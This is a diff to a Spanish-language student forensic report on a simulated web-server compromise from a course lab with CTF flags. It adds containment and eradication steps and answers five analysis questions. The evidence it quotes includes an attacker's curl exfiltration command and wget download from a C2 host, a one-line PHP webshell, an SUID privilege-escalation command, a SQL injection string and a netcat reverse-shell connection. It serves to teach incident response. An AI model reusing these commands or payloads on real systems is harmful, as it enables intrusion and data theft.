@@ -10,9 +10,9 @@
 En conformidad con las directrices éticas de la cátedra y las pautas de `CONTRIBUTING.md`, declaramos el uso de modelos de lenguaje (LLM) como asistentes analíticos en tareas de estructuración, procesamiento sintáctico y correlación cruzada de evidencias. Toda la reconstrucción pericial, extracción de artefactos volátiles y en disco, verificación criptográfica de hashes de custodia, codificación del parser forense en Python y deducción de la cadena de compromiso fue validada y respaldada por los investigadores del Grupo 12:
 
 - **Herramienta utilizada:** Asistente IA (Antigravity / Gemini).
-- **Alcance de la asistencia:** Asistencia en la estructuración general del informe pericial, redacción del resumen ejecutivo y análisis de cadena de custodia criptográfica en Secciones 1 y 2 (@gerbaudo19); asistencia en la correlación temporal cruzada entre logs de acceso, memoria y red para la Sección 3 (Línea de tiempo del ataque) y diseño del script forense `src/timeline.py` (@matiasmariatticasc).
-- **Partes originadas o modificadas:** Sección 1 (Resumen del incidente) y Sección 2 (Cadena de custodia y análisis de `auth.log`) por @gerbaudo19; Sección 3 (Línea de tiempo del ataque) y script `src/timeline.py` por @matiasmariatticasc; Sección 4 (Tabla de IOCs) y Sección 5 (Alcance del daño y evaluación de impacto) por @ColqueAlvaro; Sección 6 (Contención y erradicación) y Sección 7 (Preguntas P1–P5) a completar por @Gonza149.
-- **Verificación humana:** Se ejecutó la verificación criptográfica con `shasum -a 256 -c` identificando el archivo manipulado. Matías Mariatti verificó y ejecutó el script `src/timeline.py` sobre `caso/logs/access.log`, comprobando que los 16 eventos de la IP atacante se clasifican con rigor en sus respectivas fases (RECON, ENUM, EXPLOIT, RCE, WEBSHELL, EXFIL) y contrastó la cronología con los artefactos de memoria (`bash_history.txt`, `pslist.txt`, `netstat.txt`).
+- **Alcance de la asistencia:** Asistencia en la estructuración general del informe pericial, redacción del resumen ejecutivo y análisis de cadena de custodia criptográfica en Secciones 1 y 2 (@gerbaudo19); asistencia en la correlación temporal cruzada entre logs de acceso, memoria y red para la Sección 3 (Línea de tiempo del ataque) y diseño del script forense `src/timeline.py` (@matiasmariatticasc); elaboración de la tabla de IOCs y evaluación del alcance del daño en Secciones 4 y 5 (@ColqueAlvaro); asistencia en la definición del plan de contención y erradicación (Sección 6), resolución de las preguntas periciales P1–P5 (Sección 7) y redacción de `research.md` bajo estándares RFC 3227 e ISO/IEC 27037 (@Gonza149).
+- **Partes originadas o modificadas:** Sección 1 (Resumen del incidente) y Sección 2 (Cadena de custodia y análisis de `auth.log`) por @gerbaudo19; Sección 3 (Línea de tiempo del ataque) y script `src/timeline.py` por @matiasmariatticasc; Sección 4 (Tabla de IOCs) y Sección 5 (Alcance del daño y evaluación de impacto) por @ColqueAlvaro; Sección 6 (Contención y erradicación), Sección 7 (Preguntas P1–P5) y archivo `research.md` por @Gonza149.
+- **Verificación humana:** Se ejecutó la verificación criptográfica con `shasum -a 256 -c` identificando el archivo manipulado. Matías Mariatti verificó y ejecutó el script `src/timeline.py` sobre `caso/logs/access.log`, comprobando que los 16 eventos de la IP atacante se clasifican con rigor en sus respectivas fases (RECON, ENUM, EXPLOIT, RCE, WEBSHELL, EXFIL) y todo el equipo contrastó la cronología y las acciones de contención con los artefactos de memoria (`bash_history.txt`, `pslist.txt`, `netstat.txt`, `lsof.txt`) y de disco (`listado.txt`, `passwd.snippet`, `shell.php.evidencia.txt`).
 
 ---
 
@@ -207,10 +207,106 @@ El análisis forense digital integral sobre las tres dimensiones fundamentales d
 
 ## 6. Contención y erradicación (recomendaciones)
 
-*(Sección a completar por Gonzalo Rodríguez en Commit 4)*
+Siguiendo el ciclo de Respuesta a Incidentes de **NIST SP 800-61 Rev. 2**, una vez asegurada la adquisición forense de la memoria RAM y la imagen de disco bajo cadena de custodia, el equipo de respuesta debe ejecutar las siguientes acciones en estricto orden operativo:
+
+### Fase 1 — Contención Inmediata (Cortar el control activo del atacante)
+1. **Aislamiento de red perimetral y en host (C2 y origen atacante):**
+   Bloquear en el firewall perimetral y en el propio host `phantomcorp-web` (`10.0.0.5`) toda comunicación entrante desde la IP atacante `185.220.101.42` y todo tráfico saliente hacia el servidor C2 `45.13.37.7` (especialmente puertos `80/TCP` y `4444/TCP`):
+   ```bash
+   iptables -I INPUT -s 185.220.101.42 -j DROP
+   iptables -I OUTPUT -d 45.13.37.7 -j DROP
+   ```
+2. **Desactivación de la tarea programada antes de matar los procesos:**
+   Dado que `/etc/cron.d/phantom-maint` relanza periódicamente el canal de persistencia (como advierte el comentario en `shell.php.evidencia.txt:9`), primero se debe neutralizar el cronjob para evitar que reviva la reverse shell al matar el proceso:
+   ```bash
+   rm -f /etc/cron.d/phantom-maint
+   systemctl reload cron
+   ```
+3. **Terminación del árbol de procesos maliciosos en memoria (`pslist.txt`):**
+   Finalizar de forma inmediata los procesos asociados al canal C2, la escalada SUID y la sesión del atacante identificados en `memoria/pslist.txt:6-9` y `memoria/lsof.txt:3-5`:
+   ```bash
+   kill -9 1490 1477 1240 1201
+   ```
+4. **Revocación y rotación de credenciales comprometidas:**
+   Invalidar inmediatamente el token `phantom-api-7c1e` expuesto en `/backup/rrhh.conf`, rotar todas las credenciales y claves contenidas en `/var/www/.env`, y forzar el cambio de contraseñas de cuentas administrativas y de servicio (`www-data`, `root` y bases de datos).
+
+### Fase 2 — Erradicación (Eliminación de artefactos, persistencia y vulnerabilidades raíz)
+1. **Eliminación de la cuenta backdoor con privilegios de superusuario (`UID 0`):**
+   Remover el usuario ilegítimo `phantom-svc` agregado en `/etc/passwd` (`disco/etc/passwd.snippet:4`) y verificar que `root` sea la única cuenta con `UID=0` en el sistema:
+   ```bash
+   sed -i '/^phantom-svc:/d' /etc/passwd /etc/shadow
+   awk -F: '($3 == 0) {print $1}' /etc/passwd   # Debe devolver únicamente 'root'
+   ```
+2. **Remoción de binarios SUID ilegítimos, webshell y archivos de staging:**
+   Quitar el bit SUID y eliminar la copia maliciosa de bash `/usr/local/bin/system-check`, borrar el webshell y limpiar los directorios temporales:
+   ```bash
+   chmod 0755 /usr/local/bin/system-check && rm -f /usr/local/bin/system-check
+   rm -rf /var/www/uploads/shell.php /tmp/.p /tmp/.exfil
+   ```
+3. **Cierre de los vectores de entrada en la aplicación web:**
+   - **Remediación de SQLi (`/portal-rrhh/login`):** Reemplazar la consulta SQL concatenada por **consultas parametrizadas (*Prepared Statements*)**.
+   - **Remediación de RCE (`/api/reporte`):** Eliminar la ejecución de comandos de shell desde el parámetro `cmd` y retirar del webroot el directorio `/backup/` (`rrhh.conf`).
+   - **Endurecimiento del directorio `/var/www/uploads/`:** Configurar Nginx para prohibir la interpretación de scripts `.php` dentro de la carpeta de subidas (`location ~ ^/uploads/.*\.php$ { deny all; }`) y montar la partición `/tmp` con las opciones `noexec,nosuid,nodev`.
+
+### Fase 3 — Recuperación y Mejora Continua
+- **Reconstrucción desde imagen limpia (*Golden Image*):** Dado que el atacante obtuvo privilegios de `root` (`euid=0`), no se debe confiar en el sistema operativo comprometido (posible presencia de rootkits a nivel de kernel o binarios del sistema modificados). El servidor `phantomcorp-web` debe reprovisionarse desde cero a partir de una imagen base verificada.
+- **Centralización inmutable de logs (Mitigación de Tampering):** Configurar el envío en tiempo real de `auth.log`, `syslog` y `access.log` hacia un servidor SIEM remoto en modo *append-only* para impedir que un atacante con `root` local pueda borrar sus huellas como ocurrió en el reto R5.
 
 ---
 
 ## 7. Preguntas de análisis (P1–P5)
 
-*(Sección a completar por Gonzalo Rodríguez en Commit 4)*
+### P1 — ¿Por qué la RAM se captura antes que el disco? Ejemplo concreto del caso
+
+Según el **Orden de Volatilidad** establecido en la norma **IETF RFC 3227**, la evidencia digital debe recolectarse desde el componente más efímero hacia el más persistente. La **memoria RAM** es extremadamente volátil: su contenido desaparece de forma irreversible en el instante en que se corta el suministro eléctrico o se reinicia el servidor, y además cada comando administrativo que se ejecuta en vivo sobrescribe páginas de memoria y altera la tabla de procesos y sockets. El disco rígido, en cambio, es almacenamiento no volátil y conserva los bloques escritos aun con el equipo apagado.
+
+**Ejemplo concreto de este caso donde la memoria tenía evidencia que el disco ya no:**
+1. **Historial de comandos del atacante (`memoria/bash_history.txt`):** Antes de retirarse, el atacante ejecutó `history -c` (`memoria/bash_history.txt:10`) y eliminó el archivo `.bash_history` del disco para ocultar cómo había escalado privilegios y qué datos había robado. Sin embargo, al haberse capturado la memoria RAM en caliente mientras la sesión `bash` (`PID 1240`) aún residía en memoria, se recuperaron intactos los 9 comandos previos del atacante, incluyendo el abuso del SUID `/usr/local/bin/system-check -p -c 'id'` (`FLAG{dfir_privesc_suid}`) y el comando exacto de exfiltración `curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}`.
+2. **Conexiones de red activas y procesos en ejecución (`memoria/netstat.txt` y `pslist.txt`):** La conexión TCP activa hacia el C2 (`10.0.0.5:41022 -> 45.13.37.7:4444` en estado `ESTABLISHED` mantenida por `nc` con `PID 1490`) existía únicamente en las estructuras de sockets del kernel en RAM; si alguien hubiera apagado el servidor para clonar el disco primero, esa conexión y el árbol de procesos (`PID 812 nginx -> 1201 sh -> 1240 bash -> 1477 system-check -> 1490 nc`) se habrían perdido para siempre.
+
+---
+
+### P2 — El R5: ¿cómo se detectó que `auth.log` fue alterado y por qué invalida la evidencia si no se documenta?
+
+**Cómo se detectó la alteración:**  
+Se detectó al verificar criptográficamente la cadena de custodia mediante el comando `shasum -a 256 -c evidencia.sha256`. Mientras que los otros 8 archivos del paquete devolvieron `OK`, el archivo `logs/auth.log` arrojó **`FAILED`**: su hash SHA-256 calculado (`7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab`) no coincidió con el hash registrado en el manifiesto de custodia (`0000decafbad...`). Al inspeccionar el archivo (`logs/auth.log:5-8`), se constató que habían sido borradas las líneas posteriores a las `02:21:04 UTC` y se halló el marcador recuperado del journal (`FLAG{dfir_custodia_alterada}`).
+
+**Por qué invalida la evidencia si no se documenta:**  
+En el derecho procesal e informática forense (ISO/IEC 27037), la **cadena de custodia** garantiza el **principio de mismidad e integridad**: demostrar matemáticamente que la evidencia analizada por el perito en el laboratorio es *exactamente la misma, bit por bit*, que la que fue secuestrada en el lugar del hecho. Debido al efecto avalancha de SHA-256, el cambio de un solo byte modifica por completo el resumen criptográfico. Si un archivo presenta un hash discrepante y el perito no lo advierte ni lo documenta rigurosamente (aclarando quién, cuándo o por qué discrepó y contrastándolo con el registro original del `systemd-journald`), la defensa legal puede impugnar la totalidad de la prueba alegando **contaminación de la escena o plantado de pruebas**, haciendo que el informe pericial se caiga por completo en un juicio.
+
+---
+
+### P3 — Correlación triple (Log + Disco + Memoria) apuntando al mismo evento y timestamp
+
+La solidez de una investigación DFIR radica en triangular las tres fuentes de evidencia para probar un hecho de manera irrefutable. En este incidente, el evento de **descarga e implantación del webshell a las `02:19 UTC` del `2026-09-05`** queda demostrado simultáneamente en los tres planos:
+
+| Fuente | Artefacto y Línea | Timestamp / Estado | Evidencia exacta que apunta al mismo evento |
+|---|---|---|---|
+| **1. LOG** | `caso/logs/access.log:20` | `05/Sep/2026:02:19:02 +0000` | Petición HTTP desde `185.220.101.42`: `"GET /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php HTTP/1.1" 200 5` |
+| **2. DISCO** | `caso/disco/listado.txt:4` y `shell.php.evidencia.txt:5-10` | `2026-09-05 02:19` (`431 bytes`) | Creación en el filesystem del archivo `/var/www/uploads/shell.php` conteniendo el código PHP malicioso (`if (isset($_GET['c'])) { system($_GET['c']); }`) y la flag `FLAG{dfir_webshell_hallado}`. |
+| **3. MEMORIA** | `caso/memoria/pslist.txt:6`, `netstat.txt:5` y `bash_history.txt:4` | Captura RAM (`TIME_WAIT` / `PID 1201`) | Proceso hijo `PID 1201` (`PPID 812 nginx`, usuario `www-data`) ejecutando `sh -c wget http://45.13.37.7/s.php`, socket TCP `10.0.0.5:41108 -> 45.13.37.7:80` en estado `TIME_WAIT` (`PID 1201 wget`) y comando en `bash_history.txt:4`. |
+
+*(Una segunda correlación triple idéntica se verifica a las **02:23 UTC** entre `logs/access.log:22` leyendo `clientes.db.txt` de 48.210 bytes, `disco/listado.txt:7` creando `/tmp/.exfil/clientes.tar.gz` de 48.210 bytes a las `02:23`, y `memoria/lsof.txt:5` mostrando el descriptor `1w REG /tmp/.exfil/clientes.tar.gz` abierto por `PID 1240 bash`).*
+
+---
+
+### P4 — El atacante corrió `history -c`: ¿por qué igual se pudieron recuperar sus comandos?
+
+Cuando un usuario interactúa con una sesión de **GNU Bash**, los comandos tipeados se gestionan en dos lugares distintos:
+1. **En disco (`~/.bash_history`):** Archivo persistente que recién se sincroniza al cerrar limpiamente la sesión (`exit`) o cuando se fuerza `history -w`.
+2. **En la memoria RAM del proceso (`PID 1240 bash`):** La librería interna **`GNU Readline`** aloja cada línea ingresada como estructuras dinámicas (`HIST_ENTRY`) dentro del segmento de memoria **heap** del proceso `bash` en ejecución.
+
+Cuando el atacante ejecutó `history -c` (`memoria/bash_history.txt:10`), el comando limpió la lista de punteros activa de la utilidad `history` y evitó que se volcara al archivo del disco, pero:
+- En lenguaje C, liberar memoria en el *heap* (`free()`) **no sobrescribe con ceros (`zeroing`)** los bytes de las cadenas de texto previamente alojadas en las páginas de memoria RAM del proceso; simplemente marca esos bloques como disponibles para futuras asignaciones.
+- Además, las cadenas también permanecen en los buffers de entrada/salida de la pseudo-terminal (`pts/0`) y en estructuras de la librería `readline`.
+- Al capturar el volcado de memoria RAM antes de que el proceso se destruyera o esas páginas físicas fueran reutilizadas, el plugin **`linux.bash`** de **Volatility 3** escanea el espacio de direcciones virtuales del proceso `bash` (`PID 1240`) buscando las firmas de las estructuras `_hist_entry` y buffers de `readline`, permitiendo reconstruir íntegramente todos los comandos ejecutados, incluido el propio `history -c`.
+
+---
+
+### P5 — Cierre del curso: ¿por qué un buen forense tiene que entender cómo ataca un pentester?
+
+Haber recorrido secuencialmente el arco ofensivo (**Labs 05–08**: Reconocimiento, Enumeración, Explotación y Post-explotación), la automatización con agentes (**Lab 09**), la detección en el SOC (**Lab 10**) y finalmente la investigación **DFIR (Lab 11)** demuestra que **la seguridad ofensiva y la forensia digital son la misma cadena causal leída en direcciones opuestas**:
+
+1. **Saber qué buscar y dónde buscarlo (Hipótesis guiadas por la *Kill Chain*):** Un forense que no comprende cómo piensa ni opera un pentester se enfrenta a millones de líneas de logs y miles de archivos sin saber qué es anomalía y qué es operación normal. En cambio, quien ejecutó un ataque sabe que tras un barrido de `gobuster` (`access.log:7-12`) vendrá un intento de explotación (`POST /portal-rrhh/login` con `admin'--`), que tras lograr RCE el atacante buscará estabilidad subiendo un webshell en un directorio escribible (`/var/www/uploads/shell.php`), que como `www-data` enumerará binarios SUID (`find / -perm -4000`) y que, una vez `root`, plantará persistencia en `/etc/cron.d/` o `/etc/passwd`.
+2. **Reconocer técnicas de evasión y Anti-Forensics:** Entender cómo un atacante ofusca payloads (`%20`, `/**/`), usa flags específicos como `-p` en binarios SUID o intenta borrar sus huellas (`history -c`, edición de `auth.log`) le permite al investigador anticipar el engaño y recurrir a artefactos volátiles en RAM o al journal del sistema.
+3. **Remediación efectiva y realista:** Solo quien comprende la mecánica exacta de la vulnerabilidad explotada puede proponer en la sección de contención y erradicación defensas que cierren el problema de raíz (parametrización SQL, remoción de SUID, segmentación de red) en lugar de parches superficiales que el atacante volvería a sortear en minutos.
